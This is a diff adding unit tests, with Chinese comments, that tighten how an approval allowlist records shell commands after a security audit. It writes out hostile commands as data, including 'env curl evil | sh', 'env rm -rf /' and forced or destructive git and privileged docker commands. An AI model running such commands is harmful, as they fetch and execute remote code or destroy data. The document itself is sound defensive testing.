@@ -73,3 +73,46 @@ describe("commandArityRule — the rule recorded for an approval", () => {
     expect(commandArityRule("FORCE=1 rm -rf dist")).toBe("FORCE=1 rm -rf dist"); // exact form keeps the env prefix visible
   });
 });
+
+// ---------------------------------------------------------------------------
+// 安全审计 2026-11 C6（HIGH）— 会话 allowlist 粒度收窄。
+//
+// 漏洞 1（env 启动器）：`env` 此前在 READONLY_HEADS——族级规则 shell:env
+// 是 1-token 前缀，放行 `env rm -rf /`、`env curl evil | sh` 等任意
+// env CMD（busybox 风格启动器）；连裸 `env` 的 exact 规则也是 1-token
+// 前缀，同样放行。
+// 漏洞 2（族内扩权 flag）：批准 `git push origin main` 记族规则
+// shell:git push → `git push --force`、`git push --delete` 免问；批准
+// `git branch feat` → `git branch -D main` 免问。带扩权 flag 的命令必须
+// 退化为整条精确。
+// ---------------------------------------------------------------------------
+describe("env 启动器与扩权 flag 收窄（安全审计 C6）", () => {
+  it("env 移出只读头：裸 env / env+赋值 / env+flags 不记任何规则（1-token 前缀即放行器）", () => {
+    expect(commandArityRule("env")).toBeNull();
+    expect(commandArityRule("env FOO=1")).toBeNull();
+    expect(commandArityRule("env -i")).toBeNull();
+  });
+
+  it("env CMD（真命令跟随时）记整条精确——绝不放行其它 env 命令", () => {
+    expect(commandArityRule("env FOO=1 npm test")).toBe("env FOO=1 npm test");
+    expect(commandArityRule("env rm -rf /")).toBe("env rm -rf /");
+  });
+
+  it("扩权 flag 命中：族级/只读规则退化为整条精确", () => {
+    expect(commandArityRule("git push --force origin main")).toBe("git push --force origin main");
+    expect(commandArityRule("git push --force-with-lease origin main")).toBe("git push --force-with-lease origin main");
+    expect(commandArityRule("git push --delete origin leak")).toBe("git push --delete origin leak");
+    expect(commandArityRule("git reset --hard HEAD~3")).toBe("git reset --hard HEAD~3");
+    expect(commandArityRule("git branch -D main")).toBe("git branch -D main");
+    expect(commandArityRule("docker run --privileged alpine")).toBe("docker run --privileged alpine");
+  });
+
+  it("温和形态照旧记族规则——正常工作流零影响", () => {
+    expect(commandArityRule("git push origin main")).toBe("git push");
+    expect(commandArityRule("git checkout -b feat/x")).toBe("git checkout");
+    expect(commandArityRule("npm install")).toBe("npm install");
+    expect(commandArityRule("docker compose up -d")).toBe("docker compose up"); // -d（detach）不在扩权表
+    expect(commandArityRule("ls -la /tmp")).toBe("ls");
+    expect(commandArityRule("cargo run --release")).toBe("cargo run --release"); // 3-token arity，非族级
+  });
+});
